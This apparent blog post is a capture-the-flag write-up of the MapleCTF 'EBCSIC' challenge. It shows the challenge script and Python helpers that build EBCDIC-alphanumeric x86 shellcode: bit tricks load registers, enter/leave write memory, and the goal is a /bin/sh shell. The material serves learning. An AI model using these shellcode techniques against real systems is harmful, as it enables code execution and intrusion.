Last weekend I played [MapleCTF](https://ctftime.org/event/1676) with [ARESx](https://twitter.com/ARESxCyber). For this event we teamed up with [RCX](https://ctftime.org/team/182292) and played as RCX/ARESx.
Overall this CTF went very well as we managed to get 8th place :)

I didn't have that much time to play and therefore only looked at one pwn challenge named `EBCSIC`.

## EBCSIC
EBCSIC was a shellcoding challenge based on the Extended Binary Coded Decimal Interchange Code (EBCSIC).
The challenge consisted of a single `chal.py` file:
```python
#!/usr/bin/env python3
import string
import ctypes
import os
import sys
import subprocess

ok_chars = string.ascii_uppercase + string.digits
elf_header = bytes.fromhex("7F454C46010101000000000000000000020003000100000000800408340000000000000000000000340020000200280000000000010000000010000000800408008004080010000000000100070000000000000051E5746400000000000000000000000000000000000000000600000004000000")

print("Welcome to EBCSIC!")
sc = input("Enter your alphanumeric shellcode: ")
print(sc)
try:
    assert all(c in ok_chars for c in sc)
    sc_raw = sc.encode("cp037")
    assert len(sc_raw) <= 4096
except Exception as e:
    print("Sorry, that shellcode is not acceptable.")
    exit(1)

print("Looks good! Let's try your shellcode...")
sys.stdout.flush()

memfd_create = ctypes.CDLL("libc.so.6").memfd_create
memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_int]
memfd_create.restype = ctypes.c_int

fd = memfd_create(b"prog", 0)
os.write(fd, elf_header)
os.lseek(fd, 4096, 0)
os.write(fd, sc_raw.ljust(4096, b"\xf4"))
os.execle("/proc/self/fd/%d" % fd, "prog", {})
```
As can be seen, the challenge lets us input up to 4096 characters which need to be either uppercase ASCII (A-Z) or digits (0-9). It then encodes the input into EBCDIC, creates an in memory ELF, writes the encoded input into the `_start` function of the ELF and runs it.

Encoding the allowed characters we end up with the bytes `\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9`. These are all the bytes we can use to build our shellcode. Looking at the opcodes we can quickly see that we won't be able to write a `execve("/bin/sh", 0, 0)` shellcode by just using these opcodes. We therefore need a different way to build our shellcode.

To make debugging easier we can add `รถ` to the allowed characters which will allow us to add an `int3` instruction for debugging purposes. Simply running the binary with a single breakpoint we can see the following memory layout:

![Memory layout](/assets/maple2022-mem-layout.png)

There are two regions mapped `rwx`. The first region contains our shellcode, the second is empty. The binary does not have PIE, thefore the addresses of the first two regions are static won't be different on the challenge server.

Based on the memory layout and the available opcodes our exploitation plan is to find a way to write arbitrary values to memory (our `/bin/sh` shellcode) and then return to it.

### Getting arbitrary values into a register
Before writing anything to memory we need to get arbitrary values into a register. To do this we can use a combination of `not` and `shl` operations. To set a bit in the register while not losing its contents we `not` the register, `shl` by 1 and then `not` it again. Based on this we can write the following function which puts arbitrary values into `ebp` for us:

```python
def encode_addr(addr):
    sc = b""
    bits_set = [False] * 0x20
    for i in range(0x20):
        num = 1 << i
        if addr & num:
            bits_set[i] = True

    for i in reversed(range(0x20)):
        if bits_set[i]:
            sc += asm("not ebp")
            sc += asm("shl ebp")
            sc += asm("not ebp")
        else:
            sc += asm("shl ebp")

    return sc
```

### Writing to memory
Having the ability to get arbitrary values into a register we can now focus on finding a way to write to memory. For this we can use the `enter` instruction which pushes `ebp` onto the stack. We combine this with the `leave` instruction to set esp to arbitrary values. Based on this we can write a function that writes 32 bit values to an arbitrary addresses:

```python
def change_esp(addr):
    sc = b""
    sc += encode_addr(addr)
    sc += asm("leave")

    return sc

def write_dword(val, off):
    print("Write: ", hex(val))
    sc = b""
    # prevent segfault
    sc += change_esp(0x8058000 - off)
    sc += encode_addr(val)
    sc += asm("enter 0xc1c1, 0xc1")

    return sc
```
Since we are limited in the bytes we can send we have to use high values as operands to the `enter` instruction. Due to this we need to be aware of two things:
1. We have to make sure that `esp - operand1` is a valid address, else `enter` will segfault.
2. Due to the nesting level being > 0 (second operand) `enter` will push additional values onto the stack before pushing `ebp` which contains our arbitrary value.

In order to prevent the segfault we can chose an address somewhere in the `rwx` memory region which is far enough away from unmapped regions. To deal with `enter` pushing additional values onto the stack we have to write our shellcode in reverse since otherwise the additional `push` instructions would destroy some of the values we have already pushed.

Being able to write arbitrary values into arbitrary memory locations we can now simply write an `execve("/bin/sh", 0, 0)` shellcode somewhere and return to it.
